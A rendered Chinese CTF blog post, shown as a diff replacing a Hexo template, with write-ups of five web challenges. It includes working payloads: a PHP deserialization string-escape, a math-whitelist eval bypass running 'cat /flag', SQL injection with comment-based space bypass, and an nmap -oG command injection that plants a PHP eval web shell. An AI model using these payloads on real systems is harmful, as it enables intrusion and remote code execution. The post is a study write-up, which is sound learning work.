@@ -1,32 +1,365 @@
-extends includes/layout.pug
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>快乐寒假6 | 吴豪滨的地宫</title><meta name="keywords" content="CTF"><meta name="author" content="吴豪滨"><meta name="copyright" content="吴豪滨"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="你👱🏻‍寒假打了几次比赛,但是做出来的题跟打的比赛次数差不多 你👱🏻‍太拉胯了,只能继续看题 否则你👱🏻‍只能从CTF的世界里Get Out了 [安洵杯 2019]easy_serialize_php你👱🏻‍打开网站看源码  根据提示先看phpinfo  这里得直接搜一些敏感点如fopen,disable_,root等等 再逐步审计代码 filter函数就是正则匹配 &#x2F;php|fl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="快乐寒假6">
+<meta property="og:url" content="http://example.com/2022/02/21/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%876/index.html">
+<meta property="og:site_name" content="吴豪滨的地宫">
+<meta property="og:description" content="你👱🏻‍寒假打了几次比赛,但是做出来的题跟打的比赛次数差不多 你👱🏻‍太拉胯了,只能继续看题 否则你👱🏻‍只能从CTF的世界里Get Out了 [安洵杯 2019]easy_serialize_php你👱🏻‍打开网站看源码  根据提示先看phpinfo  这里得直接搜一些敏感点如fopen,disable_,root等等 再逐步审计代码 filter函数就是正则匹配 &#x2F;php|fl">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/02/21/rIFwTLfZou68CpY.jpg">
+<meta property="article:published_time" content="2022-02-21T14:10:05.000Z">
+<meta property="article:modified_time" content="2022-02-27T09:47:10.108Z">
+<meta property="article:author" content="吴豪滨">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/02/21/rIFwTLfZou68CpY.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/02/21/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%876/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '快乐寒假6',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-02-27 17:47:10'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
-block content
-  #post
-    if top_img === false
-      include includes/header/post-info.pug
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
 
-    article#article-container.post-content!=page.content
-    include includes/post/post-copyright.pug
-    .tag_share
-      if (theme.post_meta.post.tags)
-        .post-meta__tag-list
-          each item, index in page.tags.data
-            a(href=url_for(item.path)).post-meta__tags #[=item.name]
-      include includes/third-party/share/index.pug
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
         
-    if theme.reward.enable
-      !=partial('includes/post/reward', {}, {cache: true})
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const fontSizeVal = saveToLocal.get('global-font-size')
+    if (fontSizeVal !== undefined) {
+      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+    }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="吴豪滨的地宫" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/11/02/QcqvSFhZDRg5b7o.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2022/02/21/rIFwTLfZou68CpY.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">吴豪滨的地宫</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">快乐寒假6</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-02-21T14:10:05.000Z" title="发表于 2022-02-21 22:10:05">2022-02-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-02-27T09:47:10.108Z" title="更新于 2022-02-27 17:47:10">2022-02-27</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="快乐寒假6"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><strong>你👱🏻‍寒假打了几次比赛,但是做出来的题跟打的比赛次数差不多</strong></p>
+<p><strong>你👱🏻‍太拉胯了,只能继续看题</strong></p>
+<p><strong>否则你👱🏻‍只能从CTF的世界里Get Out了</strong></p>
+<h1 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h1><p>你👱🏻‍打开网站看源码</p>
+<p><img src="https://s2.loli.net/2022/02/21/nXdTi1l8ky6ACvr.png"></p>
+<p>根据提示先看phpinfo</p>
+<p><img src="https://s2.loli.net/2022/02/22/sdj1mGFROw2neZM.png"></p>
+<p>这里得直接搜一些敏感点如fopen,disable_,root等等</p>
+<p>再逐步审计代码</p>
+<p>filter函数就是正则匹配 /php|flag|php5|php4|fl1g/i 替换为空</p>
+<p>中间一大串就是给session初始化</p>
+<p>将session序列化之后调用filter函数</p>
+<p>最后我们需要file_get_contents读取文件</p>
+<p>d0g3_f1ag.php直接读是读不到的</p>
+<p>我们需要base64_decode($userinfo[‘img’])=d0g3_f1ag.php</p>
+<p>那么需要$userinfo[‘img’]=ZDBnM19mMWFnLnBocA==</p>
+<p>而$userinfo又是通过$serialize_info反序列化来的</p>
+<p>$serialize_info又是通过session序列化之后再过滤得来的</p>
+<p>session的img在img_path这里赋值,</p>
+<pre><code>if(!$_GET[&#39;img_path&#39;])&#123;
+$_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);
+&#125;else&#123;
+$_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));
+&#125;
+</code></pre>
+<p>但是filter会过滤掉php flag等关键字,所以这个地方需要处理</p>
+<p>你👱🏻‍搜了一下,这里涉及到php反序列化字符逃逸</p>
+<p>在php中，反序列化的过程中必须严格按照序列化规则才能成功实现反序列化<br>例如：</p>
+<pre><code>&lt;?php
+$str=&#39;a:2:&#123;i:0;s:8:&quot;aew1ec0g&quot;;i:1;s:5:&quot;aaa11&quot;;&#125;&#39;;
+var_dump(unserialize($str));
+</code></pre>
+<p>输出结果:</p>
+<pre><code>array(2) &#123; 
+[0]=&gt; string(8) &quot;aew1ec0g&quot; 
+[1]=&gt; string(5) &quot;aaa11&quot; 
+&#125;
+</code></pre>
+<p>一般我们会认为，只要增加或去除str的任何一个字符都会导致反序列化的失败。 但是事实并非如此，如果我们在str结尾的花括号后再增加一些字符呢？</p>
+<p>比如：</p>
+<pre><code> &lt;?php
+$str=&#39;a:2:&#123;i:0;s:8:&quot;aew1ec0g&quot;;i:1;s:5:&quot;aaa11&quot;;&#125;abc&#39;;
+var_dump(unserialize($str));
+</code></pre>
+<p>依然可以得到上面的结果</p>
+<p>这说明反序列化的过程是有一定识别范围的，在这个范围之外的字符(第二个例子里的abc)都会被忽略，不影响反序列化的正常进行</p>
+<p>代入题目中</p>
+<pre><code>&lt;?php
+$_SESSION[&quot;user&quot;]=&#39;flagflagflagflagflagflag&#39;；
+$_SESSION[&quot;function&quot;]=&#39;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&#39;;
+$_SESSION[&quot;img&quot;]=&#39;L2QwZzNfZmxsbGxsbGFn&#39;;
+echo serialize($_SESSION);
+</code></pre>
+<p>结果为</p>
+<pre><code>a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;
+</code></pre>
+<p>如果后台将flag的字符替换为空</p>
+<pre><code>a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;
+</code></pre>
+<p>此时将这串字符串进行序列化</p>
+<p>这个时候关注第二个s所对应的数字，本来由于有6个flag字符所以为24，现在这6个flag都被过滤了，</p>
+<p>那么它将会尝试向后读取24个字符看看是否满足序列化的规则，也即读取;s:8:”function”;s:59:”a,读取这24个字符后以”;结尾，</p>
+<p>恰好满足规则，而后第三个s向后读取img的20个字符，第四个、第五个s向后读取均满足规则，所以序列化结果为：</p>
+<pre><code>array(3) &#123; 
+[&quot;user&quot;]=&gt; string(24) &quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot; 
+[&quot;img&quot;]=&gt; string(20) &quot;ZDBnM19mMWFnLnBocA==&quot; 
+[&quot;dd&quot;]=&gt; string(1) &quot;a&quot; 
+&#125;
+</code></pre>
+<p>SESSION数组的键值img对应的值发生了改变</p>
+<p>如果我们能够控制原来SESSION数组的funcion的值但无法控制img的值，我们就可以通过这种方式间接控制到img对应的值。</p>
+<p>这个感觉就像sql注入一样，他本来想读取的base64编码是：L2QwZzNfZmxsbGxsbGFn,但是由于过滤掉了flag,向后读取的过程中把键值function放到了第一个键值的内容里面，用ZDBnM19mMWFnLnBocA==代替了真正的base64编码，读取了d0g3_f1ag.php的内容。</p>
+<p>而识别完成后最后面的”;s:3:”img”;s:20:”L2QwZzNfZmxsbGxsbGFn”;}被忽略掉了，不影响正常的反序列化过程</p>
+<p>所以构造payload：</p>
+<pre><code> get:f=show_image 
+ post:_SESSION[flagflag]=&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;
+</code></pre>
+<p>回显</p>
+<pre><code>&lt;?php
 
-    //- ad
-    if theme.ad && theme.ad.post
-      .ads-wrap!=theme.ad.post
+$flag = &#39;flag in /d0g3_fllllllag&#39;;
 
-    if theme.post_pagination
-      include includes/pagination.pug
-    if theme.related_post && theme.related_post.enable
-      != related_posts(page,site.posts)
+?&gt;
+</code></pre>
+<p>base64(d0g3_fllllllag)=L2QwZzNfZmxsbGxsbGFn</p>
+<pre><code> get:f=show_image 
+ post:_SESSION[fl1gfl1g]=&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;
+</code></pre>
+<p>得到flag</p>
+<h1 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h1><p>你👱🏻‍打开题目看到源码</p>
+<p><img src="https://s2.loli.net/2022/02/23/TNYBjPvlR6toMeA.png"></p>
+<p>首先是审计源码</p>
+<p>scandir() 函数：返回指定目录中的文件和目录的数组。</p>
+<p>base_convert() 函数：在任意进制之间转换数字。</p>
+<p>dechex() 函数：把十进制转换为十六进制。</p>
+<p>hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符。</p>
+<p>var_dump() ：函数用于输出变量的相关信息。</p>
+<p>readfile() 函数：输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false。您可以通过 @readfile() 形式调用该函数，来隐藏错误信息。</p>
+<p>语法：readfile(filename,include_path,context)</p>
+<p>过滤后可以使用白名单中的数学函数，.,^等，同时长度限制在80个字符以内,要得到flag 只靠几个数学函数是没用的,得想办法构造函数被eval执行</p>
+<p>构造system(“cat /flag”)会受到函数和引号限制,引号删掉后命令依然可以执行,而对于函数,可以利用动态函数的性质,用字符串做函数名,加上括号就会被当成函数执行。</p>
+<p>这里要熟悉两个php特点</p>
+<pre><code>动态函数
+php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数
+例如：$function = &quot;sayHello&quot;;$function();
 
-    if page.comments !== false && theme.comments && theme.comments.use
-      - var commentsJsLoad = true
-      !=partial('includes/third-party/comments/index', {}, {cache: true})
-      
+php中函数名默认为字符串
+例如本题白名单中的asinh和pi可以直接异或，这就增加了构造字符的选择
+</code></pre>
+<p>比如</p>
+<pre><code>    c=($_GET[a])($_GET[b])
+</code></pre>
+<p>如果a=system,b=cat /flag,就可以执行system(cat /flag)。</p>
+<p>所以可以写成</p>
+<pre><code> c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag
+</code></pre>
+<p>但是白名单会检测c中出现的变量名,a和b都不能出现,但是可以用白名单的值,GET中括号和和GET本身都不能出现，中括号可以用{}替代，因此这道题的核心就是构造_GET。</p>
+<p>所以构造如下</p>
+<pre><code>base_convert(37907361743,10,36)(dechex(1598506324))
+</code></pre>
+<p>因为:</p>
+<pre><code>base_convert(37907361743,10,36)=&gt;&quot;hex2bin&quot;，
+dechex(1598506324)=&gt;&quot;5f474554&quot;
+hex2bin(&quot;5f474554&quot;)=&gt;_GET
+</code></pre>
+<p>为了不让结果太长，需要用一个白名单变量来保存上述值,最好用最短的pi，否则长度很容易超限制。</p>
+<p>所以得到最终payload为</p>
+<pre><code>   c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;cos&#125;)&amp;pi=system&amp;cos=cat /flag
+</code></pre>
+<p>得到flag</p>
+<h1 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h1><p>你👱🏻‍打开是这个样子</p>
+<p><img src="https://s2.loli.net/2022/02/25/KrTUAtXYeO9cl3C.png"></p>
+<p>看起来很乱,其实是源🐴</p>
+<p>整理完后发现是flask框架</p>
+<p>geneSign是对传入的param与其他字符串拼接并返回其md5值</p>
+<p>De1ta是主要,传入3个参数以及ip,先判断param是否是gopher或者file开头的参数,不过则过到Task中并返回task的Exec()函数结果,另外hint提示在flag.txt中有flag</p>
+<p>现在打开De1ta,并传参action=scan,param=flag.txt,sign=94130db2c6dc650b303b28b8dd307c71637063,一步步操作来找出条件,先传参,再进入Exec()函数,</p>
+<p>先使用checkSign函数检验sign，所以我们需要getSign(self.action, self.param) == self.sign成立，这个可以通过geneSign来获取</p>
+<p>然后2个if，判断scan或read 是否在action内，在则，前者是把param对应文件的内容写入result.txt，后者是把result.txt取出来并返还给我们，也就是说，这2个if我们都需要调用，这样就能获取到flag，而scan和read的判断是包含，所以我们的action就可以是readscan，或者scanread，那sign怎么获取呢？</p>
+<p>我们要绕过getSign(self.action, self.param) == self.sign的同时还需要action为readscan，或者scanread</p>
+<p>getsign函数为</p>
+<pre><code>def getSign(action, param):
+return hashlib.md5(secert_key + param + action).hexdigest()
+</code></pre>
+<p>他用param和action做拼接,而action是固定的scan</p>
+<p>我们先使用geneSign,传参为flag.txtread然后拼接为flag.txtreadscan，生成sign保存下来</p>
+<p>得到072df7309130a4d57a36026390d7f3ca</p>
+<p>再传参数param=flag.txt   action=readscan   sign=072df7309130a4d57a36026390d7f3ca</p>
+<p><img src="https://s2.loli.net/2022/02/25/49RXsG3ntqrwaSL.png"></p>
+<h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h1><p>你👱🏻‍打开题目是个登录界面</p>
+<p><img src="https://s2.loli.net/2022/02/26/L4sIoKC2dOT39XN.png"></p>
+<p>随便注册登录后</p>
+<p><img src="https://s2.loli.net/2022/02/26/uCPexLyoDOmXV98.png"></p>
+<p>找一下注入点,发现在发布广告的地方可以注入</p>
+<p>输入1’</p>
+<p><img src="https://s2.loli.net/2022/02/26/bsZ8FUS1JmaEwLz.png"></p>
+<p>可能有SQL注入</p>
+<p><img src="https://s2.loli.net/2022/02/26/YcCJepi5yKQx1EV.png"></p>
+<p>发现过滤了空格</p>
+<p>使用/xx/绕过</p>
+<pre><code>1&#39;/**/union/**/select/**/1,2,3/**/&#39;
+</code></pre>
+<p><img src="https://s2.loli.net/2022/02/26/No715AOhHrpLVZW.png"></p>
+<p>往后面一直加到22列</p>
+<pre><code>1&#39;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39;
+</code></pre>
+<p><img src="https://s2.loli.net/2022/02/26/fqnihuUBd6gwkYL.png"></p>
+<p>查表</p>
+<pre><code> 1&#39;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39;
+</code></pre>
+<p><img src="https://s2.loli.net/2022/02/26/6a7YsfEQCrSuZmj.png"></p>
+<p>设第二列别名为b</p>
+<pre><code> 1&#39;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/b,3/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39;
+</code></pre>
+<p><img src="https://s2.loli.net/2022/02/26/npMyzXD5S4CIbLT.png"></p>
+<p>设第三列别名为b查flag</p>
+<pre><code> 1&#39;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39;
+</code></pre>
+<p><img src="https://s2.loli.net/2022/02/26/KFlifrJ3g5C2aAX.png"></p>
+<p>得到flag</p>
+<h1 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h1><p><a target="_blank" rel="noopener" href="https://fohunbrella.github.io/2022/02/06/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%873/">https://fohunbrella.github.io/2022/02/06/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%873/</a></p>
+<p>之前做过nmap的题,这里又遇到了</p>
+<p>将之前的payload</p>
+<pre><code> 127.0.0.1 | &#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG test.php&#39;
+</code></pre>
+<p>放进去试试</p>
+<p><img src="https://s2.loli.net/2022/02/27/caT81q5HEpGl37s.png"></p>
+<p>你👱🏻‍fail了</p>
+<p>这里应该是过滤了东西,所以再改改试试</p>
+<pre><code> 127.0.0.1 | &#39; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG test.phtml &#39;
+</code></pre>
+<p>上传成功,去看看传的🐴</p>
+<p><img src="https://s2.loli.net/2022/02/27/3PNjwAoMSd72DOU.png"></p>
+<p>得到flag</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">吴豪滨</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/02/21/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%876/">http://example.com/2022/02/21/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%876/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">吴豪滨的地宫</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2022/02/21/rIFwTLfZou68CpY.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/02/28/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%982/"><img class="prev-cover" src="https://s2.loli.net/2022/02/28/DchyG29YqFBAfJR.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">你爹刷题2</div></div></a></div><div class="next-post pull-right"><a href="/2022/02/20/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%875/"><img class="next-cover" src="https://s2.loli.net/2022/02/21/OAu6CDveWbtYpPh.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">快乐寒假5</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/03/23/DASCTF%202022/" title="DASCTF 2022"><img class="cover" src="https://s2.loli.net/2022/03/23/ouOyf5ecU1hawIS.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-23</div><div class="title">DASCTF 2022</div></div></a></div><div><a href="/2021/11/02/badmac/" title="badmac"><img class="cover" src="https://i.loli.net/2021/11/09/gRnKyC1ztL7PIDH.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-02</div><div class="title">badmac</div></div></a></div><div><a href="/2021/11/06/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%981/" title="你爹刷题1"><img class="cover" src="https://i.loli.net/2021/11/09/SaopgqOWJmMT6cE.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-06</div><div class="title">你爹刷题1</div></div></a></div><div><a href="/2022/02/28/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%982/" title="你爹刷题2"><img class="cover" src="https://s2.loli.net/2022/02/28/DchyG29YqFBAfJR.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-28</div><div class="title">你爹刷题2</div></div></a></div><div><a href="/2022/03/01/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%983/" title="你爹刷题3"><img class="cover" src="https://img1.baidu.com/it/u=3722771254,1462812708&fm=253&fmt=auto&app=138&f=JPEG?w=370&h=500" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-01</div><div class="title">你爹刷题3</div></div></a></div><div><a 